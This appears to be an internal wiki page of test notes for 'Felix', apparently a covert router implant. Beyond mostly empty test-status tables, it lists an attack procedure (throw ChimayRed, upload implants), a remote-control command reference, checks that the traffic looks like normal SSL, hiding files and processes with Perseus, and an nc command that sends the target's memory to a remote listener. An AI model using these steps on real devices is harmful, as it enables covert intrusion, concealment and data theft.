
                        Owner: User #14587667
Felix v1.0 Test Notes
Felix Smoke Tests

Configurator
configuration file
command line
interactive shell


Base
Trigger Module
Trigger Client

 
MikroTik
RB493G (MIPSBE)
IP: 172.20.100.6
ROS: 6.30
Netinstall: 11/19/2015
Felix Attack Procedure

Throw ChimayRed
Upload TS
Upload Felix, Flux, Perseus via TS
Start Felix
Test Felix
Start Flux
Test Felix, Flux
Start Perseus
Test Felix, Flux, Perseus

 
Matrix of Devices/Tests Performed
MikroTik

MIPS-BE
PPC
x86

Ubiquiti
MIPS-BE
AVTech
ARM
Ubuntu

12.04 x86

12.04 x86_64


Debian
8.0 x86_64
CentOS
6.4 x86
Smoke Test Matrix


Device/Test
1a
1b
1c
2a
2b
2c
3a
3b
3c
3d
3e
3f
3g
3h
3i
3j
3k
3l
3m
3n
3o
3p
4a
4b
4c
4d
4e
5a
5b
5c
6a
6b




ID
Status
Task


6
incomplete
MT RB 493G (MIPS-BE)




ID
Status
Task


7
complete
 




ID
Status
Task


8
complete
 




ID
Status
Task


155
complete
 




ID
Status
Task


9
complete
 




ID
Status
Task


179
complete
 




ID
Status
Task


180
complete
 




ID
Status
Task


1
complete
 




ID
Status
Task


2
complete
 




ID
Status
Task


10
complete
 




ID
Status
Task


11
complete
 




ID
Status
Task


12
complete
 




ID
Status
Task


13
complete
 




ID
Status
Task


14
complete
 




ID
Status
Task


15
complete
 




ID
Status
Task


16
complete
 




ID
Status
Task


17
complete
 




ID
Status
Task


18
complete
 




ID
Status
Task


19
complete
 




ID
Status
Task


20
complete
 




ID
Status
Task


21
complete
 




ID
Status
Task


22
complete
 




ID
Status
Task


23
complete
 




ID
Status
Task


25
complete
 




ID
Status
Task


26
complete
 




ID
Status
Task


27
complete
 




ID
Status
Task


191
complete
 




ID
Status
Task


327
complete
 




ID
Status
Task


142
complete
 




ID
Status
Task


143
complete
 




ID
Status
Task


156
complete
 




ID
Status
Task


157
complete
 




ID
Status
Task


158
complete
 






ID
Status
Task


28
incomplete
MikroTik (PPCPowerPC (IBM))




ID
Status
Task


29
incomplete
 




ID
Status
Task


30
incomplete
 




ID
Status
Task


159
incomplete
 




ID
Status
Task


31
incomplete
 




ID
Status
Task


181
incomplete
 




ID
Status
Task


182
incomplete
 




ID
Status
Task


32
incomplete
 




ID
Status
Task


3
incomplete
 




ID
Status
Task


33
incomplete
 




ID
Status
Task


34
incomplete
 




ID
Status
Task


35
incomplete
 




ID
Status
Task


36
incomplete
 




ID
Status
Task


37
incomplete
 




ID
Status
Task


38
incomplete
 




ID
Status
Task


39
incomplete
 




ID
Status
Task


40
incomplete
 




ID
Status
Task


41
incomplete
 




ID
Status
Task


42
incomplete
 




ID
Status
Task


43
incomplete
 




ID
Status
Task


44
incomplete
 




ID
Status
Task


45
incomplete
 




ID
Status
Task


46
incomplete
 




ID
Status
Task


48
incomplete
 




ID
Status
Task


49
incomplete
 




ID
Status
Task


50
incomplete
 




ID
Status
Task


192
incomplete
 




ID
Status
Task


328
incomplete
 




ID
Status
Task


144
incomplete
 




ID
Status
Task


145
incomplete
 




ID
Status
Task


160
incomplete
 




ID
Status
Task


161
incomplete
 




ID
Status
Task


162
incomplete
 






ID
Status
Task


51
incomplete
MikroTik (x86)




ID
Status
Task


52
incomplete
 




ID
Status
Task


53
incomplete
 




ID
Status
Task


163
incomplete
 




ID
Status
Task


54
incomplete
 




ID
Status
Task


183
incomplete
 




ID
Status
Task


184
incomplete
 




ID
Status
Task


55
incomplete
 




ID
Status
Task


4
incomplete
 




ID
Status
Task


56
incomplete
 




ID
Status
Task


57
incomplete
 




ID
Status
Task


58
incomplete
 




ID
Status
Task


59
incomplete
 




ID
Status
Task


60
incomplete
 




ID
Status
Task


61
incomplete
 




ID
Status
Task


62
incomplete
 




ID
Status
Task


63
incomplete
 




ID
Status
Task


64
incomplete
 




ID
Status
Task


65
incomplete
 




ID
Status
Task


66
incomplete
 




ID
Status
Task


67
incomplete
 




ID
Status
Task


68
incomplete
 




ID
Status
Task


69
incomplete
 




ID
Status
Task


71
incomplete
 




ID
Status
Task


72
incomplete
 




ID
Status
Task


73
incomplete
 




ID
Status
Task


193
incomplete
 




ID
Status
Task


329
incomplete
 




ID
Status
Task


146
incomplete
 




ID
Status
Task


147
incomplete
 




ID
Status
Task


164
incomplete
 




ID
Status
Task


165
incomplete
 




ID
Status
Task


166
incomplete
 




 


ID
Status
Task


74
incomplete
 




ID
Status
Task


75
incomplete
 




ID
Status
Task


167
incomplete
 




ID
Status
Task


76
incomplete
 




ID
Status
Task


185
incomplete
 




ID
Status
Task


186
incomplete
 




ID
Status
Task


77
incomplete
 




ID
Status
Task


5
incomplete
 




ID
Status
Task


78
incomplete
 




ID
Status
Task


79
incomplete
 




ID
Status
Task


80
incomplete
 




ID
Status
Task


81
incomplete
 




ID
Status
Task


82
incomplete
 




ID
Status
Task


83
incomplete
 




ID
Status
Task


84
incomplete
 




ID
Status
Task


85
incomplete
 




ID
Status
Task


86
incomplete
 




ID
Status
Task


87
incomplete
 




ID
Status
Task


88
incomplete
 




ID
Status
Task


89
incomplete
 




ID
Status
Task


90
incomplete
 




ID
Status
Task


91
incomplete
 




ID
Status
Task


93
incomplete
 




ID
Status
Task


94
incomplete
 




ID
Status
Task


95
incomplete
 




ID
Status
Task


194
incomplete
 





ID
Status
Task


330
incomplete
 


 



ID
Status
Task


148
incomplete
 




ID
Status
Task


149
incomplete
 




ID
Status
Task


168
incomplete
 




ID
Status
Task


169
incomplete
 




ID
Status
Task


170
incomplete
 




 


ID
Status
Task


96
incomplete
 




ID
Status
Task


97
incomplete
 




ID
Status
Task


171
incomplete
 




ID
Status
Task


98
incomplete
 




ID
Status
Task


187
incomplete
 




ID
Status
Task


188
incomplete
 




ID
Status
Task


99
incomplete
 




ID
Status
Task


100
incomplete
 




ID
Status
Task


101
incomplete
 




ID
Status
Task


102
incomplete
 




ID
Status
Task


103
incomplete
 




ID
Status
Task


104
incomplete
 




ID
Status
Task


105
incomplete
 




ID
Status
Task


106
incomplete
 




ID
Status
Task


107
incomplete
 




ID
Status
Task


108
incomplete
 




ID
Status
Task


109
incomplete
 




ID
Status
Task


110
incomplete
 




ID
Status
Task


111
incomplete
 




ID
Status
Task


112
incomplete
 




ID
Status
Task


113
incomplete
 




ID
Status
Task


114
incomplete
 




ID
Status
Task


116
incomplete
 




ID
Status
Task


117
incomplete
 




ID
Status
Task


118
incomplete
 




ID
Status
Task


195
incomplete
 




ID
Status
Task


331
incomplete
 




ID
Status
Task


150
incomplete
 




ID
Status
Task


151
incomplete
 




ID
Status
Task


172
incomplete
 




ID
Status
Task


173
incomplete
 




ID
Status
Task


174
incomplete
 




 


ID
Status
Task


119
incomplete
 




ID
Status
Task


120
incomplete
 




ID
Status
Task


175
incomplete
 




ID
Status
Task


121
incomplete
 




ID
Status
Task


189
incomplete
 




ID
Status
Task


190
incomplete
 




ID
Status
Task


122
incomplete
 




ID
Status
Task


123
incomplete
 




ID
Status
Task


124
incomplete
 




ID
Status
Task


125
incomplete
 




ID
Status
Task


126
incomplete
 




ID
Status
Task


127
incomplete
 




ID
Status
Task


128
incomplete
 




ID
Status
Task


129
incomplete
 




ID
Status
Task


130
incomplete
 




ID
Status
Task


131
incomplete
 




ID
Status
Task


132
incomplete
 




ID
Status
Task


133
incomplete
 




ID
Status
Task


134
incomplete
 




ID
Status
Task


135
incomplete
 




ID
Status
Task


136
incomplete
 




ID
Status
Task


137
incomplete
 




ID
Status
Task


139
incomplete
 




ID
Status
Task


140
incomplete
 




ID
Status
Task


141
incomplete
 




ID
Status
Task


196
incomplete
 




ID
Status
Task


332
incomplete
 




ID
Status
Task


152
incomplete
 




ID
Status
Task


153
incomplete
 




ID
Status
Task


176
incomplete
 




ID
Status
Task


177
incomplete
 




ID
Status
Task


178
incomplete
 




Smoke Tests Performed


Run Configurator
without persistance
with persistence
with Dead Man Switch (DMS)



Install Felix
without persistence
with persistence
with DMS


Run Kickstarter (Interactive)
debug - Set the debug level

delete - Delete a file on the destination

From tsh: touch /flash/rw/test4.txt
delete /flash/rw/test4.txt
From tsh: ls /flash/rw/


end - End the current kickstart session

exec  - Execute a command via the default shell on the remote side
exec ps ax

exit - Exit the program (same as "quit" or CTRL+D)

get - Get a file from the destination

On Icon: touch /home/user1/test1.txt
get /home/user1/test1.txt /flash/rw/test1.txt
From tsh: ls /flash/rw



halt - End *all* sessions (including the current one).

Open two felix sessions
halt, and then wait a minute or two to confirm both sessions were closed.
status


help - List available commands with help or detailed help with help <cmd>.

kick - Send a kick to the destination
kick 172.20.100.6 80 tcp


pexec - Execute a process with arguments on the remote side (without a shell!)

pexec touch /flash/rw/test2.txt
From tsh: ls /flash/rw



print - Retrieve a value set in the current CLICommand-Line Interface session
See 'set' command


put - Copy a file to the destination

First perform steps under 'get' command
put /flash/rw/test1.txt /home/user1/test3.txt
From Icon: ls /home/user1/test3.txt



reset - Reset the current settings in the CLICommand-Line Interface back to defaults

set mtu 1400
print mtu
reset all



set - Set a value in the current CLICommand-Line Interface session 

set callback 7777 8888 (2,10)
print callback


status - Display status and history for this session

uninstall - Uninstall from the destination
Cloned process is gone (ps ax | grep <cloned process>)



Run Kickstarter (CLICommand-Line Interface) and --command (-c)
kick
exec
pexec
get
put


Install other tools
Install Tsh
Install Perseus
Install Flux


Tweak settings
Small MTU
Reset CLICommand-Line Interface settingsreset all




 
Ad Hoc Testing Matrix


Device/Test
1a
1b
2a
2b
2c
2d
3
4
5
6a
6b
7
8
9
10




ID
Status
Task


197
incomplete
MT RB 493G (MIPS-BE)




ID
Status
Task


198
complete
 




ID
Status
Task


199
complete
 




ID
Status
Task


200
complete
 




ID
Status
Task


201
complete
 




ID
Status
Task


202
complete
 




ID
Status
Task


203
complete
 




ID
Status
Task


204
complete
 




ID
Status
Task


205
complete
 




ID
Status
Task


206
complete
 




ID
Status
Task


207
complete
 




ID
Status
Task


208
complete
 




ID
Status
Task


209
complete
 




ID
Status
Task


210
complete
 




ID
Status
Task


211
complete
 




ID
Status
Task


333
complete
 




 
Ad Hoc Testing

Inspect wireshark
Check MTUMaximum Transmission Unit during file transfer (can not check on ICON VM.  Since raw sockets are used, wiresharks shows incorrect packet sizes when captured on ICON VMVirtual Machine)
Check that traffic appears as normal SSLSecure Socket Layer traffic


Install other tools
Install Busybox
Install TinyShell
Install Perseus
Install Flux


Hide files and processes with Perseus while running Felix
Monitor target device syslog messages on remote server
Monitor target device's SNMPSimple Network Management Protocol traps on remote server
Dump memory
With implant installed
ICON: nc -l -p 9999 | dd bs=1048576 of=target-ram.bin
Target: bb dd if=/dev/mem bs=1048576 count=256 | bb nc 172.20.12.100 9999


After implant uninstalledsame as previous procedure



Perform string analysis on binaries.
Implant, Remove, Implant
Attempt to launch felix more than once.
Inspect memory consumption during several kick sessions
Run command 'ps ax | grep dhcp' and note PIDProcess ID for Felix DHCPDynamic Host Configuration Protocol process
pmap PID
Kick the device
pmap PID
Repeat the last 2 steps several times and check if mapped memory total increases.



 
ToDo


ID
Status
Task


154
incomplete
 


 
Potential Bugs
Error received when using felix to delete a file:Session (172.20.100.6:21 tcp)> delete /flash/rw/test2.txtCommand response was an error! 120ERROR: Failed to securely delete file /flash/rw/test2.txt
 
 

Previous versions:
| 1 
| 2 
| 3 
| 4 
| 5 
| 6 
| 7 
| 8 
| 9 
| 10 
| 11 
| 12 
| 13 
| 14 
| 15 
| 16 
| 17 
| 18 
| 19 
| 20 
| 21 
| 22 
| 23 
| 24 
| 25 
| 26 
|
                    